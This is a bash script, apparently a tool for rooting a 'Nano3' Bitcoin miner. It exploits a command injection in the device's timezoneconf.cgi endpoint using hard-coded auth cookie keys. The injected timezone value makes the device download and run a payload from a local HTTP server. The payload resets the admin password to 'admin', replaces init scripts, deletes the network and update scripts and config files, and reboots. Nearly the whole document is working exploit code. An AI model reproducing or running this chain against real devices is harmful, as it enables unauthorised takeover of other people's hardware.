#!/bin/bash

# ========================
# Configuration
# ========================
SERVER_PORT=8080
LOCAL_IP=$(hostname -I | awk '{print $1}')  # local IP of your PC
BASE_DIR="$(dirname "$0")"                  # directory where this script is located
TOOLS_DIR="$BASE_DIR/tools"
SCRIPT_PATH="$TOOLS_DIR/rootnano"
DEST_DIR="/etc/init.d"

# ------------------------------------------------------------------
# Path to rcS file
# ------------------------------------------------------------------
RCS_FILE="$TOOLS_DIR/rcS"

# ------------------------------------------------------------------
# Read values from rcS
# ------------------------------------------------------------------
nano3_pool=$(grep '^nano3_pool=' "$RCS_FILE" | cut -d'"' -f2)
wifiname=$(grep '^wifiname=' "$RCS_FILE" | cut -d'"' -f2)
wifipass=$(grep '^wifipass=' "$RCS_FILE" | cut -d'"' -f2)
btc_address=$(grep '^btc_address=' "$RCS_FILE" | cut -d'"' -f2)

# ========================
# Verify tools folder and required files
# ========================
if [[ -z "$nano3_pool" || -z "$wifiname" || -z "$wifipass" || -z "$btc_address" ]]; then
    echo "Error: rcS contains empty fields. Please fill nano3_pool, wifiname, wifipass and btc_address before proceeding."
    exit 1
fi
echo "All fields are filled. Continuing..."

if [ ! -d "$TOOLS_DIR" ]; then
    echo "ERROR: the directory $TOOLS_DIR does not exist"
    echo "Create a 'tools' folder next to this script and place rcS and S99btcminer inside."
    exit 1
fi

if [ ! -f "$TOOLS_DIR/rcS" ]; then
    echo "ERROR: $TOOLS_DIR/rcS not found"
    exit 1
fi

if [ ! -f "$TOOLS_DIR/S99btcminer" ]; then
    echo "ERROR: $TOOLS_DIR/S99btcminer not found"
    exit 1
fi

echo "Detected rcS and S99btcminer in $TOOLS_DIR"

# ========================
# Ask for the Nano3 device IP
# ========================
while [[ -z "$NANO3_IP" ]]; do
    read -p "Enter the Nano3 device IP: " NANO3_IP
done
# ------------------------------------------------------------------
# Choose action: reboot or poweroff
# ------------------------------------------------------------------
read -p "After performing the operation, do you want the device to reboot (r) or power-off (p)? [r/p]: " choice
case "$choice" in
    [Rr]* ) FINAL_CMD="/sbin/reboot"; echo "El dispositivo se reiniciará." ;;
    [Pp]* ) FINAL_CMD="/sbin/poweroff"; echo "El dispositivo se apagará completamente." ;;
    * ) FINAL_CMD="/sbin/reboot"; echo "Opción no válida – por defecto se reiniciará." ;;
esac

# ========================
# rootnano payload running on the miner
# ========================
cat << EOF > "$SCRIPT_PATH"
#!/bin/sh

LOG_FILE="/opt/pwned.log"

log() {
    echo "[\$(date '+%Y-%m-%d %H:%M:%S')] \$1" >> "\$LOG_FILE"
}

log "=== rootnano started from $LOCAL_IP ==="

# Set admin password to "admin"
echo -ne "admin\nadmin\n" | passwd admin >/dev/null 2>&1
log "Admin password changed to 'admin'."

# Generate ED25119 SSH key
yes | ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N '' >/dev/null 2>&1
log "Hostkey SSH ed25519 generated."

# --------- COPY TOOLS FILES ---------
#DEST_DIR="/etc/init.d"

# Download and overwrite custom rcS
if wget -q http://$LOCAL_IP:$SERVER_PORT/tools/rcS -O "$DEST_DIR/rcS"; then
    chmod +x "$DEST_DIR/rcS"
    log "rcS installed from tools (no backup)."
else
    log "ERROR: Could not download rcS."
fi

# Download and overwrite custom S50nanowatch
if wget -q http://$LOCAL_IP:$SERVER_PORT/tools/S50nanowatch -O "$DEST_DIR/S50nanowatch"; then
    chmod +x "$DEST_DIR/S50nanowatch"
    log "watchdog installed from tools."
else
    log "ERROR: Could not download Watchdog."
fi

# Download and copy S99btcminer
if wget -q http://$LOCAL_IP:$SERVER_PORT/tools/S99btcminer -O "$DEST_DIR/S99btcminer"; then
    chmod +x "$DEST_DIR/S99btcminer"
    log "S99btcminer installed from tools."
else
    log "ERROR: S99btcminer could not be downloaded."
fi

# -------------------------------------------------------------------
# Delete unwanted init scripts
# -------------------------------------------------------------------
rm -f /etc/init.d/S40network && log "S40network eliminado." || log "ERROR: S40network no se pudo eliminar."
rm -f /etc/init.d/S80swupdate && log "S80swupdate eliminado." || log "ERROR: S80swupdate no se pudo eliminar."

log "Restarting the miner..."
rm /data/usrcon/cgminer.ini
rm /data/usrcon/systemcfg.ini
sync
$FINAL_CMD
EOF

chmod +x "$SCRIPT_PATH"

# ========================
# Start HTTP server to serve rootnano and tools/
# ========================
cd "$BASE_DIR"
echo "Starting server at http://$LOCAL_IP:$SERVER_PORT/"
python3 -m http.server $SERVER_PORT >/dev/null 2>&1 &
SERVER_PID=$!

sleep 2  # give the server a moment to start

# ========================
# Attempt exploit with possible auth keys
# ========================
AUTH_KEYS=(
  "ff0000ff4813494d137e1631bba301d5"  # default one
  "ff0000ffe489f84c23a6fbd9017f631a"  # alternative auth key
)

SUCCESS=0
for AUTH in "${AUTH_KEYS[@]}"; do
    echo "Testing exploit with auth=$AUTH ..."
    RESPONSE=$(curl -s -w "%{http_code}" -o /tmp/curl.out \
      "http://$NANO3_IP/timezoneconf.cgi" \
      -b "auth=$AUTH" \
      --data-raw "timezone=%3Bwget%20http%3A%2F%2F$LOCAL_IP%3A$SERVER_PORT%2Ftools%2Frootnano%20-O%20%2Ftmp%2Frootnano%3Bsh%20%2Ftmp%2Frootnano%3B")

    if [ "$RESPONSE" = "200" ]; then
        echo "Exploit launched successfully with auth=$AUTH"
        SUCCESS=1
        break
    else
        echo "Failed with auth=$AUTH (HTTP $RESPONSE), trying next..."
    fi
done

# ========================
# Stop HTTP server
# ========================
kill $SERVER_PID 2>/dev/null || true
echo "Server stopped."

if [ $SUCCESS -ne 1 ]; then
    echo "None of the auth keys worked. Check connectivity or try manually."
else
    echo "Task completed. Check /opt/pwned.log on the device via SSH for details."
fi
